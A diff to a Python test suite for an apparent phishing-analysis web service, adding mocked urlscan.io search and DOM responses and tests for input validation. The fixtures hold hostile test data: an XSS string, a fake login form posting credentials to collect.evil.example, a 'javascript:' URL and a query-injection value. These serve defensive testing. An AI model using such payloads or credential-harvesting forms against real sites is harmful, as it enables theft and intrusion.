@@ -69,6 +69,7 @@ import httpx  # noqa: E402
 XSS = '<img src=x onerror="window.__xss=1">'
 CALLS: list[str] = []
 SCANS: list[dict] = []
+SEARCHES: list[str] = []
 UNHANDLED: list[str] = []
 
 
@@ -125,6 +126,16 @@ def handler(request: httpx.Request) -> httpx.Response:
     if host == "urlscan.io" and "/scan/" in path:
         SCANS.append(json.loads(request.content))
         return httpx.Response(200, json={"uuid": "11111111-2222-3333-4444-555555555555", "result": "https://urlscan.io/result/1/"})
+    if host == "urlscan.io" and "/dom/" in path:
+        return httpx.Response(200, text='<html><body><form action="https://collect.evil.example/post" method="POST"><input type="text" name="user">'
+                                        '<input type="password" name="pw"><input type="hidden" name="t" value="1"></form>'
+                                        '<form action="/search"><input name="q"></form></body></html>')
+    if host == "urlscan.io" and "/search/" in path:
+        SEARCHES.append(str(request.url))
+        return httpx.Response(200, json={"results": [
+            {"_id": "aaaaaaaa-2222-3333-4444-555555555555", "task": {"time": "2026-09-20T10:00:00.000Z", "url": "https://phish.example/login", "visibility": "public"},
+             "page": {"url": "https://phish.example/login", "ip": "198.51.100.9", "country": "NL"}, "verdicts": {"overall": {"score": 100, "malicious": True, "hasVerdicts": True}}},
+            {"_id": "not-a-uuid", "task": {"url": "https://x.example/"}, "page": {}}]})
     if host == "urlscan.io" and "/screenshots/" in path:
         return httpx.Response(200, content=_png(), headers={"Content-Type": "image/png"})
     if host == "urlscan.io" and "/result/" in path:
@@ -269,6 +280,9 @@ for lang in ("pl", "en"):
     rec(p + "urlscan scan private host", client.post("/api/urlscan/scan", json={"url": "http://192.168.1.10/admin"}, headers=H))
     rec(p + "urlscan scan bad scheme", client.post("/api/urlscan/scan", json={"url": "javascript:alert(1)"}, headers=H))
     rec(p + "urlscan scan bad visibility", client.post("/api/urlscan/scan", json={"url": "https://phish.example/", "visibility": "everyone"}, headers=H))
+    rec(p + "urlscan search", client.get("/api/urlscan/search", params={"url": "hxxps://phish[.]example/login"}, headers=H))
+    rec(p + "urlscan search bad url", client.get("/api/urlscan/search", params={"url": "http://10.0.0.1/"}, headers=H))
+    rec(p + "urlscan search injection", client.get("/api/urlscan/search", params={"url": 'https://a.example" OR page.domain:"b/'}, headers=H))
     rec(p + "urlscan screenshot bad uuid", client.get("/api/urlscan/screenshot/not-a-uuid", headers=H))
     shot = client.get("/api/urlscan/screenshot/11111111-2222-3333-4444-555555555555", headers=H)
     SHOT_PROBE = (shot.status_code, shot.headers.get("content-type"), shot.content[:4])
@@ -334,7 +348,7 @@ EXPECTED_STATUS = {
     "lookup ip": 200, "lookup domain": 200, "lookup invalid": 400, "lookup invalid ip": 400, "lookup batch": 200,
     "lookup batch too many": 422, "urlscan scan": 200, "urlscan result": 200, "urlscan result bad uuid": 400,
     "urlscan scan defanged": 200, "urlscan scan private host": 400, "urlscan scan bad scheme": 400, "urlscan scan bad visibility": 400,
-    "urlscan screenshot bad uuid": 400, "history create urlscan": 200, "history create urlscan bad thumbnail": 400,
+    "urlscan screenshot bad uuid": 400, "urlscan search": 200, "urlscan search bad url": 400, "urlscan search injection": 400, "history create urlscan": 200, "history create urlscan bad thumbnail": 400,
     "history create urlscan no summary": 400,
     "report preview": 200, "ip-info": 200, "report submit bad": 400, "report submit ok": 200,
     "report submit cooldown": 409, "email analyze phishing": 200, "email bad id": 404, "email bad id2": 400,
@@ -401,7 +415,12 @@ if len(_defanged) != 2 or any(x["url"].startswith("hxxp") for x in SCANS) or any
     failures.append(f"urlscan submissions were not normalised (defanged URL, visibility): {SCANS}")
 if any("192.168" in x["url"] or x["url"].startswith("javascript") for x in SCANS):
     failures.append("urlscan accepted a private host or a non-HTTP scheme")
+if not SEARCHES or any('page.domain:"phish.example"' not in q.replace("%22", '"').replace("%3A", ":") for q in SEARCHES):
+    failures.append(f"urlscan search query was not the plain domain query: {SEARCHES[:2]}")
 _summary = summary_stub
+_forms = _summary.get("forms") or []
+if not (len(_forms) == 2 and _forms[0]["password"] and _forms[0]["external"] and not _forms[1]["external"] and _forms[0]["fields"] == ["text:user", "password:pw"]):
+    failures.append(f"urlscan form extraction is wrong: {_forms}")
 if not (_summary["verdict"]["level"] == "high" and len(_summary["redirects"]) == 2 and _summary["tls"]["age_days"] == 1 and _summary["verdict"]["brands"]):
     failures.append(f"urlscan summary is wrong: {_summary['verdict']}, redirects={_summary['redirects']}")
 if probes["CORS allow-origin header"]:
